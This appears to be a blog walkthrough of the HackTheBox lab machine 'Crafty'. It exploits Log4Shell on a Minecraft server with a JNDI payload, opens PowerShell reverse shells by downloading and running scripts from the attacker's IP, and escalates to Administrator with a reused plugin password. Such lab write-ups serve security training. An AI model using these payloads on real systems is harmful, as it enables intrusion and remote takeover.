<!DOCTYPE html>
<html lang="en-US">

<head>
  <meta charset='utf-8'>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="index, follow">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
    integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
  <script src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
    crossorigin="anonymous"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"
    integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI"
    crossorigin="anonymous"></script>
  <link rel="shortcut icon" href="/assets/images/favicon.ico" type="image/x-icon" />
  <script type="text/javascript" async
    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
    </script>
  <link rel="stylesheet" href="/assets/css/style.css?v=e024481cec4f3bb4cd4ae73ac213f0162f926411">
  <link rel="stylesheet" href="/assets/css/prism.css">
  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" rel="stylesheet" crossorigin="anonymous">
  <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/brands.min.css" rel="stylesheet" crossorigin="anonymous">
  
  <meta name="theme-color" content="#000000" />
  <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HTB Crafty writeup | Gabriel blog</title>
<meta name="generator" content="Jekyll v3.9.5" />
<meta property="og:title" content="HTB Crafty writeup" />
<meta name="author" content="gabri47" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Crafty is a easy windows machine in HackTheBox in which we have to abuse the following things. In first place, is needed to install a minecraft client to abuse the famous Log4j Shell in a minecraft server to gain access as svc_minecraft. Finally, we have to analyze a minecraft plugin (.jar) with jdgui and we can see that is using a password that it’s also for user Administrator." />
<meta property="og:description" content="Crafty is a easy windows machine in HackTheBox in which we have to abuse the following things. In first place, is needed to install a minecraft client to abuse the famous Log4j Shell in a minecraft server to gain access as svc_minecraft. Finally, we have to analyze a minecraft plugin (.jar) with jdgui and we can see that is using a password that it’s also for user Administrator." />
<link rel="canonical" href="http://localhost:4000/writeups/2024/HTB/Crafty.html" />
<meta property="og:url" content="http://localhost:4000/writeups/2024/HTB/Crafty.html" />
<meta property="og:site_name" content="Gabriel blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-06-11T00:00:00+02:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HTB Crafty writeup" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gabri47"},"dateModified":"2024-06-11T00:00:00+02:00","datePublished":"2024-06-11T00:00:00+02:00","description":"Crafty is a easy windows machine in HackTheBox in which we have to abuse the following things. In first place, is needed to install a minecraft client to abuse the famous Log4j Shell in a minecraft server to gain access as svc_minecraft. Finally, we have to analyze a minecraft plugin (.jar) with jdgui and we can see that is using a password that it’s also for user Administrator.","headline":"HTB Crafty writeup","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/2024/HTB/Crafty.html"},"url":"http://localhost:4000/writeups/2024/HTB/Crafty.html"}</script>
<!-- End Jekyll SEO tag -->

  
</head>

<body>

  <div id="header">
    <div class="container">
      <div class="title-container">
        <a id="a-title" href="/">
          <h1>Gabriel blog</h1>
        </a>
        <small class="nav-main d-flex justify-content-center">
    
    <a href = "/writeups">Writeups</a>
    
    &nbsp;<span style="color: #b5e853;">|</span>&nbsp;
    
    
    <a href = "/solutions">Solutions</a>
    
    &nbsp;<span style="color: #b5e853;">|</span>&nbsp;
    
    
    <a href = "/blog">Blog</a>
    
    
</small>
      </div>
      <br>

      
      
<nav class="navbar navlinks">
    <button class="navbar-toggler d-flex w-100 justify-content-between collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
        aria-controls="navbarSupportedContent" aria-expanded="true" aria-label="Toggle navigation">
        <span>HTB Writeups</span>
        <i style="float: right;" class="fa fa-bars menu-icon" aria-hidden="true"></i>
    </button>

    <div class="navbar-collapse collapse" id="navbarSupportedContent">
        <div class="m-1 mt-2">

            
            
            

            
            
            

            <small class="m-2">2024</small>
            
            <ul style="padding-top: 0.1em;">
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Codify.html"> HTB Codify Writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;nodejs/&gt; &lt;rce/&gt; &lt;sqlite3/&gt; &lt;hashes/&gt; &lt;sudoers/&gt; &lt;bash-bruteforcing/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Hospital.html"> HTB Hospital Writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;webshell_upload/&gt; &lt;kernel_exploits/&gt; &lt;hash_cracking/&gt; &lt;pivoting/&gt; &lt;phishing/&gt; &lt;ghostscript_rce/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Surveillance.html"> HTB Surveillance writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;craft_cms/&gt; &lt;hash_cracking/&gt; &lt;zoneminder_exploit/&gt; &lt;sudoers/&gt; &lt;abusing_zmupdate.pl/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Devvortex.html"> HTB Devvortex Writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;joomla/&gt; &lt;CVE-2023-23752/&gt; &lt;information_leakage/&gt; &lt;password_reuse/&gt; &lt;joomla_rce/&gt; &lt;database_enumeration/&gt; &lt;hash_cracking/&gt; &lt;ssh/&gt; &lt;sudoers/&gt; &lt;apport-cli/&gt; &lt;CVE-2023-1326/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Napper.html"> HTB Napper Writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;information_disclosure/&gt; &lt;abusing_backdoor/&gt; &lt;naplistener/&gt; &lt;elasticsearch/&gt; &lt;reverse_engineering/&gt; &lt;go_reverse_engineering/&gt; &lt;decryption_with_AES/&gt; &lt;runascs/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Monitored.html"> HTB Monitored Writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;udp/&gt; &lt;snmp/&gt; &lt;nagiosxi/&gt; &lt;api/&gt; &lt;nagios_rce/&gt; &lt;sudoers/&gt; &lt;abusing_nagios_scripts/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Ouija.html"> HTB Ouija Writeup</a>
                    <br>
                    <small>[50]</small>
                    <span class="tag">
                        <small>
                            &lt;fuzzing/&gt; &lt;html_inspection/&gt; &lt;information_leakage/&gt; &lt;haproxy/&gt; &lt;http_request_smuggling/&gt; &lt;CVE-2021-40346/&gt; &lt;source_code_inspection/&gt; &lt;hash_extension_attack/&gt; &lt;lfi/&gt; &lt;proc_files/&gt; &lt;php_plugin/&gt; &lt;integer_overflow/&gt; &lt;buffer_overflow/&gt; &lt;webshell/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Bizness.html"> HTB Bizness Writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;apache_ofbiz/&gt; &lt;CVE-2023-51467/&gt; &lt;CVE-2023-49070/&gt; &lt;hash_cracking/&gt; &lt;hash_salt/&gt; &lt;su/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Analysis.html"> HTB Analysis Writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;fuzzing/&gt; &lt;ldap-injection/&gt; &lt;php-shell/&gt; &lt;upload-vulnerabilities/&gt; &lt;autologon/&gt; &lt;dll-injection/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Pov.html"> HTB Pov Writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;lfi/&gt; &lt;web.config/&gt; &lt;deserialization/&gt; &lt;exploiting-viewstate/&gt; &lt;decrypting-securestring/&gt; &lt;sedebugprivilege/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Crafty.html"> HTB Crafty writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;minecraft/&gt; &lt;log4j/&gt; &lt;jdgui/&gt; &lt;analyzing-jar/&gt; &lt;minecraft-plugins/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Office.html"> HTB Office writeup</a>
                    <br>
                    <small>[40]</small>
                    <span class="tag">
                        <small>
                            &lt;joomla-information-disclosure/&gt; &lt;CVE-2023-23752/&gt; &lt;smb-enumeration/&gt; &lt;pcap-tcp-packet-analysis/&gt; &lt;wireshark/&gt; &lt;krb-hash/&gt; &lt;joomla-rce/&gt; &lt;runascs/&gt; &lt;password-reuse/&gt; &lt;port-forwading/&gt; &lt;libreoffice-odt-exploitation/&gt; &lt;CVE-2023-2255/&gt; &lt;dpapi-creds/&gt; &lt;mimikatz/&gt; &lt;bloodhound/&gt; &lt;modifying-group-policy/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Jab.html"> HTB Jab writeup</a>
                    <br>
                    <small>[30]</small>
                    <span class="tag">
                        <small>
                            &lt;xmpp/&gt; &lt;xmpp-user-enumeration/&gt; &lt;asreproast/&gt; &lt;hash-cracking/&gt; &lt;executedcom/&gt; &lt;dcomexec.py/&gt; &lt;openfire-rce/&gt; &lt;CVE-2023-32315/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                <li style="line-height: 1; padding-top: 0.4em;">
                    <a href="http://localhost:4000/writeups/2024/HTB/Perfection.html"> HTB Perfection writeup</a>
                    <br>
                    <small>[20]</small>
                    <span class="tag">
                        <small>
                            &lt;ssti/&gt; &lt;ruby/&gt; &lt;crlf-injection/&gt; &lt;sqlite/&gt; &lt;hash-cracking/&gt; &lt;sudo-group/&gt;
                        </small>
                    </span>
                </li>
                
                
                
                
                
                
            </ul>

            
            

            
            

        </div>
    </div>
</nav>

      

      
      <div id="bottom-bar">
        <div class="social d-flex flex-column justify-content-center w-100">
    <a href="/search" class="text-center w-100 mt-3 mb-2">
      <i class="fa fa-sm fa-search"></i>
    </a>
    <div class="social-links-bar d-flex justify-content-center mb-2">
        
        
        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
        </a>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    </div>
    
    <div class="htb_badge d-flex justify-content-center">
        
        <script src="https://www.hackthebox.eu/badge/831031"></script>
        
    </div>
    <div class="thm_badge">
        
    </div>
    
</div>

      </div>
    </div>
  </div>

  <div id="content" class="container">
    <section id="main_content">
      <h5 class="mt-0 mb-2">
        
        
          HTB
        
        
      </h5>
    
      <h1 class="d-flex w-100 justify-content-between">
        
        
          <span>HTB Crafty writeup</span> <span class="points"> [20 pts] </span>
        
        
      </h1>


<script>

</script>

<p>Crafty is a easy windows machine in HackTheBox in which we have to abuse the following things. In first place, is needed to install a minecraft client to abuse the famous Log4j Shell in a minecraft server to gain access as svc_minecraft. Finally, we have to analyze a minecraft plugin (.jar) with jdgui and we can see that is using a password that it’s also for user Administrator.</p>
    
      <h1 id="enumeration">
        
        
          Enumeration <a href="#enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>
    
      <h2 id="port-scanning">
        
        
          Port scanning <a href="#port-scanning" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h2>

<p>We start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:</p>

<pre><code class="language-bash">❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.249
# Nmap 7.94SVN scan initiated Fri May 17 12:39:40 2024 as: nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn -oN tcpTargeted 10.10.11.249
Nmap scan report for 10.10.11.249
Host is up (0.13s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://crafty.htb
|_http-server-header: Microsoft-IIS/10.0
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 17 12:40:19 2024 -- 1 IP address (1 host up) scanned in 39.09 seconds
</code></pre>

<ul>
  <li>-sVC: Identifies service and version.</li>
  <li>-p-: scans all the range of ports (1-65535).</li>
  <li>–open: shows only open ports and not filtered or closed.</li>
  <li>-sS: TCP SYN scan that improves velocity because it doesn’t establish the connection.</li>
  <li>–min-rate 5000: Sends 5000 packets per second to improve velocity (don’t do this in a 
real environment).</li>
  <li>-n: Disables DNS resolution protocol.</li>
  <li>-v: Enables verbose to see which ports are opened while it’s scanning</li>
  <li>-Pn: Disables host discovery protocol (ping).</li>
  <li>-oN targeted: Exports the evidence to a file named “tcpTargeted”.</li>
</ul>

<p>We have a minecraft server with version 1.16.5 which is very interesting in a HackTheBox machine, and a web running on port 80</p>
    
      <h2 id="web-enumeration">
        
        
          Web enumeration <a href="#web-enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h2>

<p>First let’s see the technologies used with whatweb:</p>
<pre><code class="language-bash">❯ whatweb http://10.10.11.249 --log-brief=whatweb-ip.txt
http://10.10.11.249 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.249], Microsoft-IIS[10.0], RedirectLocation[http://crafty.htb], Title[Document Moved]
ERROR Opening: http://crafty.htb - no address for crafty.htb
</code></pre>

<p>We can see that it uses the domain crafty.htb so it’s needed to add it to the /etc/hosts:</p>

<pre><code class="language-bash">10.10.11.249 crafty.htb
</code></pre>

<p>We can also see that it’s using IIS:</p>

<pre><code class="language-bash">❯ whatweb http://crafty.htb --log-brief=whatweb-ip.txt
http://crafty.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.249], JQuery[3.6.0], Microsoft-IIS[10.0], Script[text/javascript], Title[Crafty - Official Website]
</code></pre>
<p>Taking a look to this domain in the browser, it’s possible to see that the machine is more related to minecraft and play.crafty.htb is a valid domain:</p>

<p><img src="/assets/images/Crafty/crafty.htb-main_page.png" alt="crafty.htb main page" /></p>

<p>Which we have to add to the /etc/hosts and it redirect us to crafty.htb:</p>

<pre><code class="language-bash">❯ curl -v play.crafty.htb
* Host play.crafty.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.249
*   Trying 10.10.11.249:80...
* Connected to play.crafty.htb (10.10.11.249) port 80
&gt; GET / HTTP/1.1
&gt; Host: play.crafty.htb
&gt; User-Agent: curl/8.7.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 301 Moved Permanently
&lt; Content-Type: text/html; charset=UTF-8
&lt; Location: http://crafty.htb
&lt; Server: Microsoft-IIS/10.0
&lt; Date: Tue, 11 Jun 2024 17:43:33 GMT
&lt; Content-Length: 140
&lt; 
&lt;head&gt;&lt;title&gt;Document Moved&lt;/title&gt;&lt;/head&gt;
* Connection #0 to host play.crafty.htb left intact
&lt;body&gt;&lt;h1&gt;Object Moved&lt;/h1&gt;This document may be found &lt;a HREF="http://crafty.htb"&gt;here&lt;/a&gt;&lt;/body&gt;
</code></pre>

<p>There is no subdomain either:</p>

<pre><code class="language-bash">❯ wfuzz -c -t 100 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.crafty.htb" -u http://crafty.htb --hh=140
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://crafty.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================


Total time: 0
Processed Requests: 4989 
Filtered Requests: 4989
Requests/sec.: 0
</code></pre>

<p>The web doesn’t have nothing interesting, so let’s look for the minecraft server.</p>
    
      <h1 id="access-as-svc_minecraft">
        
        
          Access as svc_minecraft <a href="#access-as-svc_minecraft" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>

<p>Looking in google related vulnerabilities with minecraft, we can see the famous log4j, which I thought that only affects version 1.17 but in <a href="https://help.minecraft.net/hc/en-us/articles/4416199399693-Security-Vulnerability-in-Minecraft-Java-Edition">this article</a> of the official minecraft page is said that for some versions, it’s needed to add a JVM argument to the server startup command. This versions include 1.16.5 which is the one running in the crafty minecraft server. The thought here is <code>What if this server hasn't added this JVM argument?</code>.</p>

<blockquote>
  <p>Note: To achieve this, we have to install a minecraft client and this is why Crafty was gived so low rating because a lot needed to install TLauncher and this had a lot of controversy due to that it had a virus. However, I will do it in a separate fresh Kali Linux VM to not be risky.</p>
</blockquote>

<p>Now, to connect to the server I will use <a href="https://tlauncher.org/en/">TLauncher</a> (select the 1.16.5 version to install in the launcher), add the server play.crafty.htb and connect:</p>

<pre><code class="language-bash">❯ unzip TLauncher.v10.zip 
Archive:  TLauncher.v10.zip
   creating: TLauncher.v10/
  inflating: TLauncher.v10/README-EN.txt  
  inflating: TLauncher.v10/README-RUS.txt  
  inflating: TLauncher.v10/TLauncher.jar  
❯ h4x0r@nothing:~/Downloads$ cd TLauncher.v10
❯ h4x0r@nothing:~/Downloads/TLauncher.v10$ ls
README-EN.txt  README-RUS.txt  TLauncher.jar   
❯ h4x0r@nothing:~/Downloads/TLauncher.v10$ java -jar TLauncher.jar
</code></pre>

<p><img src="/assets/images/Crafty/tlauncher_version_picking.png" alt="TLauncher version picking" /></p>

<p><img src="/assets/images/Crafty/entered_crafty_server.png" alt="Entered crafty server" /></p>

<p>Now, I will download <a href="https://github.com/kozmer/log4j-shell-poc">this tool</a> to abuse log4j. But first we have to download the official jdk of java version 1.8.0_20 (file jdk-8u20-linux-x64.tar.gz) as the repository says. Download it and extract it in the same folder you cloned the repository with this command:</p>

<pre><code class="language-bash">$ tar -xf jdk-8u20-linux-x64.tar.gz
</code></pre>

<p>Also, execute this command to have all the dependencies:</p>

<pre><code class="language-bash">$ pip3 install -r requirements.txt 
Defaulting to user installation because normal site-packages is not writeable
Requirement already satisfied: colorama in /usr/lib/python3/dist-packages (from -r requirements.txt (line 1)) (0.4.6)
Collecting argparse (from -r requirements.txt (line 2))
  Downloading argparse-1.4.0-py2.py3-none-any.whl.metadata (2.8 kB)
Downloading argparse-1.4.0-py2.py3-none-any.whl (23 kB)
Installing collected packages: argparse
Successfully installed argparse-1.4.0
</code></pre>

<p>Then, you have to modify the poc.py to replace <code>String cmd="/bin/sh";</code> to <code>String cmd="powershell.exe"</code> due to the fact that it’s a windows machine.</p>

<p>Now run the <code>poc.py</code> to start the ldap and http servers required to exploit log4j with the <code>--lport 443</code> and <code>--userip &lt;your tun0 ip&gt;</code> parameters to receive the shell on port 443 of the ip of your hackthebox vpn:</p>

<pre><code class="language-bash">$ python3 poc.py --userip 10.10.14.221 --lport 443

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://10.10.14.221:1389/a}

[+] Starting Webserver on port 8000 http://0.0.0.0:8000
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Listening on 0.0.0.0:1389
</code></pre>

<p>Also spawn a nc listener on port 443:</p>

<pre><code class="language-bash">$ rlwrap nc -lvnp 443
listening on [any] 443 ...
</code></pre>

<p>Send the payload:</p>

<p><img src="/assets/images/Crafty/log4j_payload_sended.png" alt="Log4j payload sended" /></p>

<p>We receive the shell as svc_minecraft! And we can see user.txt:</p>

<pre><code class="language-bash">$ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.221] from (UNKNOWN) [10.10.11.249] 49681
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\users\svc_minecraft\server&gt; whoami
crafty\svc_minecraft
PS C:\users\svc_minecraft\server&gt; cd ..
PS C:\users\svc_minecraft&gt; type Desktop\user.txt
50****************************3b
</code></pre>

<p>Now I will update my shell to a <a href="https://github.com/antonioCoco/ConPtyShell">ConPtyShell</a> to have more stable shell, do ctrl+c, have autocompletion, etc:</p>

<p><strong>Start HTTP server to share Invoke-ConPtyShell.ps1</strong>:</p>

<pre><code class="language-bash">$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</code></pre>

<p><strong>Start new nc listener</strong>:</p>

<pre><code class="language-bash">$ nc -lvnp 443   
listening on [any] 443 ...
</code></pre>

<p><strong>Execute ConPtyShell</strong></p>

<pre><code class="language-powershell">PS C:\users\svc_minecraft\server&gt; IEX(New-Object Net.WebClient).downloadString("http://10.10.14.221/Invoke-ConPtyShell.ps1")
PS C:\users\svc_minecraft\server&gt; Invoke-ConPtyShell -RemoteIp 10.10.14.221 -RemotePort 443 -Rows 52 -Cols 191

CreatePseudoConsole function found! Spawning a fully interactive shell
</code></pre>

<blockquote>
  <p>Note: you can view your current terminal rows and columns by using <code>stty size</code> in another window.</p>
</blockquote>

<p>And we receive the shell:</p>

<pre><code class="language-bash">Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\users\svc_minecraft\server&gt;
</code></pre>

<p>Now do ctrl+z, <code>stty raw -echo; fg</code> and <code>ctrl+l</code>.</p>
    
      <h1 id="access-as-administrator">
        
        
          Access as administrator <a href="#access-as-administrator" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>

<p>Looking at the plugins, we can see that it exists one custom plugin called <code>playercounter</code>:</p>

<pre><code class="language-powershell">
PS C:\users\svc_minecraft\server&gt; cd .\plugins\ 
PS C:\users\svc_minecraft\server\plugins&gt; dir 


    Directory: C:\users\svc_minecraft\server\plugins


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/27/2023   2:48 PM           9996 playercounter-1.0-SNAPSHOT.jar
</code></pre>

<p>It would be useful to transfer it to our machine to analyze it:</p>

<p><strong>Create SMB server</strong>:</p>

<pre><code class="language-bash">$ impacket-smbserver -smb2support -username test -password 'test123$!' smbDir $(pwd)
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
</code></pre>

<p><strong>Use the SMB server in Z: and copy the file to this logic partition</strong>:</p>

<pre><code class="language-powershell">PS C:\users\svc_minecraft\server\plugins&gt; net use z: \\10.10.14.221\smbDir /user:test 'test123$!'
The command completed successfully.

PS C:\users\svc_minecraft\server\plugins&gt; copy .\playercounter-1.0-SNAPSHOT.jar z:
</code></pre>

<p>Now, as it is a .jar file, we can analyze it with jd-gui:</p>

<pre><code class="language-bash">$ sudo apt install jd-gui
$ jd-gui playercounter-1.0-SNAPSHOT.jar
</code></pre>

<p>And we can see the source code:</p>

<p><img src="/assets/images/Crafty/minecraft_plugin_source_code.png" alt="Source code of minecraft plugin" /></p>

<p>Notice that there is a password that is used for the <a href="https://wiki.vg/RCON">rcon protocol</a> to execute the command <code>players online count</code>.</p>

<p>Testing if this password is reused for admin with <code>RunasCs.exe</code>, it works:</p>

<pre><code class="language-powershell">PS C:\users\svc_minecraft\server\plugins&gt; cd C:\Windows\Temp            
PS C:\Windows\Temp&gt; mkdir privesc 


    Directory: C:\Windows\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----                                                                                                                                          
d-----        6/11/2024   2:19 PM                privesc                                                                                                                                       


PS C:\Windows\Temp&gt; cd privesc
# Download RunasCs.exe from your hosted http server
PS C:\Windows\Temp\privesc&gt; certutil.exe -f -urlcache -split http://10.10.14.221/RunasCs.exe
****  Online  ****
  0000  ...
  ca00
CertUtil: -URLCache command completed successfully.
# Execute whoami as Administrator with RunasCs.exe 
PS C:\Windows\Temp\privesc&gt; .\RunasCs.exe 'Administrator' s67u84zKq8IXw "cmd /c whoami"

crafty\administrator
</code></pre>

<p>So I will create a base64 payload to execute a ConPtyShell reverse shell (which you can create with the command <code>echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.221/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp 10.10.14.221 -RemotePort 443 -Rows 52 -Cols 191" | iconv -t utf16le | base64 -w 0</code>) and paste it in the <code>-enc</code> argument of powershell to obtain the shell as administrator:</p>

<pre><code class="language-powershell">PS C:\Windows\Temp\privesc&gt; .\RunasCs.exe 'Administrator' s67u84zKq8IXw "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMgAxAC8ASQBuAHYAbwBrAGUALQBDAG8AbgBQAHQAeQBTAGgAZQBsAGwALgBwAHMAMQAnACkAOwAgAEkAbgB2AG8AawBlAC0AQwBvAG4AUAB0AHkAUwBoAGUAbABsACAALQBSAGUAbQBvAHQAZQBJAHAAIAAxADAALgAxADAALgAxADQALgAyADIAMQAgAC0AUgBlAG0AbwB0AGUAUABvAHIAdAAgADQANAAzACAALQBSAG8AdwBzACAANQAyACAALQBDAG8AbABzACAAMQA5ADEACgA="
</code></pre>

<p>And we receive it!:</p>

<pre><code class="language-bash">$ nc -lvnp 443
listening on [any]
PS C:\Windows\system32&gt; whoami
crafty\administrator
</code></pre>

<p>Now we can see the root.txt and finish this entertaining machine:</p>

<pre><code class="language-powershell">PS C:\Windows\system32&gt; cd C:\Users\Administrator 
PS C:\Users\Administrator&gt; type .\Desktop\root.txt 
2f****************************fa
</code></pre>
    
      <h1 id="extra">
        
        
          Extra <a href="#extra" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>

<p>In this section, we will see why this minecraft version was vulnerable to log4j.</p>

<p>Well, in <a href="https://help.minecraft.net/hc/en-us/articles/4416199399693-Security-Vulnerability-in-Minecraft-Java-Edition">this minecraft article</a>, it’s said that for servers with the version 1.16.5, it’s needed to run the <code>java -jar server.jar</code> with the argument <code>-Dlog4j.configurationFile=log4j2_112-116.xml</code> that specifies a log4j configuration file that is <a href="https://launcher.mojang.com/v1/objects/02937d122c86ce73319ef9975b58896fc1b491d1/log4j2_112-116.xml">here</a> to avoid log4shell vulnerability.</p>

<p>In the processes, we can see that the minecraft server it’s not running with that parameter and that’s why it’s vulnerable:</p>

<pre><code class="language-powershell">PS C:\Users\Administrator&gt; gwmi win32_process | select commandline | format-list | findstr server.jar
commandline : "c:\windows\system32\cmd.exe" /c "c:\program files\java\jdk1.8.0_171\bin\java.exe" -Xmx1024M -Xms1024M -jar c:\users\svc_minecraft\server\server.jar
commandline : "c:\program files\java\jdk1.8.0_171\bin\java.exe"  -Xmx1024M -Xms1024M -jar c:\users\svc_minecraft\server\server.jar
</code></pre>


<div id="share-links">
  <span id="divider-line">____</span>
  <br><br>
  <small>11 June 2024</small>
  <div>
    
    Tags:
    
    <a href="/search?q=minecraft" class="tag" style="font-family: 'Cascadia Code';">minecraft</a>
    
